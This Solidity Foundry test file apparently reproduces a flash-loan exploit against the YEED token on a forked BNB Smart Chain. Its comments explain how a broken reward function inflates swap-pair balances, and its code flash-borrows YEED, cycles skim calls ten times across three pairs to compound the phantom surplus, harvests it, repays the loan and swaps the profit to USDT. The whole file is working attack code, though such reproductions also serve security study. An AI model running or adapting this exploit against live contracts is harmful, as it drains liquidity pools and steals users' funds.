// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
    IPancakePair usdtYeedHoSwapPair = IPancakePair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);
    IPancakePair usdtYeedPair = IPancakePair(0xA7741d6b60A64b2AaE8b52186adeA77b1ca05054);
    IPancakePair hoYeedPair = IPancakePair(0xbC70FA7aea50B5AD54Df1edD7Ed31601C350A91a);
    IPancakePair zeedYeedPair = IPancakePair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);
    IERC20 yeed = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 17_132_514); // fork bsc at block 17132514
    }

    // VULNERABILITY: Phantom YEED balance inflation via broken _takeReward + permissionless skim on affected pairs
    // (See full analysis in sources/YEED_e7748f/YEED.sol near _takeReward)
    // The exploit abuses:
    // - YEED _isSwapPair list (swapPair, swapPairZeed, swapPairHo) receive full rewardFee added to _balances on every sell-to-pair
    // - Triple-add bug + no reserve sync => balanceOf(pair) >> reserves => skim extracts
    // - Skim-to-pair re-triggers fee logic (amplification)
    // EXPLOIT STEPS:
    // 1. Fork at block ~17132514 (pre-attack state).
    // 2. Approve router for YEED.
    // 3. Flash-swap borrow almost all YEED from usdtYeedHoSwapPair (the callback receives amount1 YEED).
    // 4. In pancakeCall: yeed.transfer(usdtYeedPair, amount1) -- this hits isSwapPair(to) => _transferSell => _takeReward, injecting phantom YEED into all 3 pairs.
    // 5. 10-iteration round-robin: usdtYeedPair.skim(hoYeedPair); hoYeedPair.skim(zeedYeedPair); zeedYeedPair.skim(usdtYeedPair);
    //    Each inter-pair skim transfer re-triggers _takeReward (because dest is _isSwapPair), compounding the phantom YEED surplus across the cycle.
    // 6. Final skims to self: usdtYeedPair.skim(this); hoYeedPair.skim(this); zeedYeedPair.skim(this); -- harvests the amplified excess YEED (now balance matches after skim).
    // 7. Repay flash loan: yeed.transfer(flashPair, amount1*1000/997) using some of the harvested YEED.
    // 8. Swap remaining YEED profit via router: YEED -> HO (via hoYeedPair token) -> USDT (via usdtYeedPair token0), send to msg.sender.
    // 9. Log balances before/after showing USDT profit.
    // Why no capital needed up-front: flash loan seeds the first sell; skimmed surplus covers repayment + profit.
    // The usdtYeedHoSwapPair is just a convenient flash source for YEED (not one of the dividend pairs).
    function testExploit() public {
        yeed.approve(address(pancakeRouter), type(uint256).max);
        (uint112 _reserve0, uint112 _reserve1,) = usdtYeedHoSwapPair.getReserves();
        usdtYeedHoSwapPair.swap(0, _reserve1 - 1, address(this), new bytes(1));
        emit log_named_uint("Before exploit, USDT balance of attacker:", usdt.balanceOf(msg.sender));
        address[] memory path = new address[](3);
        path[0] = address(yeed);
        path[1] = hoYeedPair.token0();
        path[2] = usdtYeedPair.token0();
        pancakeRouter.swapExactTokensForTokens(
            yeed.balanceOf(address(this)), 0, path, msg.sender, block.timestamp + 120
        );
        emit log_named_uint("After exploit, USDT balance of attacker:", usdt.balanceOf(msg.sender));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        yeed.transfer(address(usdtYeedPair), amount1);
        for (uint256 i = 0; i < 10; i++) {
            usdtYeedPair.skim(address(hoYeedPair));
            hoYeedPair.skim(address(zeedYeedPair));
            zeedYeedPair.skim(address(usdtYeedPair));
        }

        usdtYeedPair.skim(address(this));
        hoYeedPair.skim(address(this));
        zeedYeedPair.skim(address(this));

        yeed.transfer(msg.sender, (amount1 * 1000) / 997);
    }
}
